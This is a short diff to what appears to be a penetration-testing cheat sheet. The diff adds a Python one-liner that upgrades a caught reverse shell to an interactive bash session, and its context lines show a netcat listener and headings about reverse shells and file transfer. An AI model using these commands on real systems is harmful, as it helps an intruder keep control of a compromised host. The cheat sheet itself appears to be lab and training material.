@@ -113,6 +113,9 @@ nc -nvlp 5555
 
 # PowerShell reverse shells are large; use a trusted local snippet when needed (lab only).
 
+#after the reverse shell, spaw a real one
+python -c 'import pty; pty.spawn("/bin/bash")' #or with double quotes if it doesn't work
+
 # -------------------------
 # Transferring files (netcat)
 # -------------------------
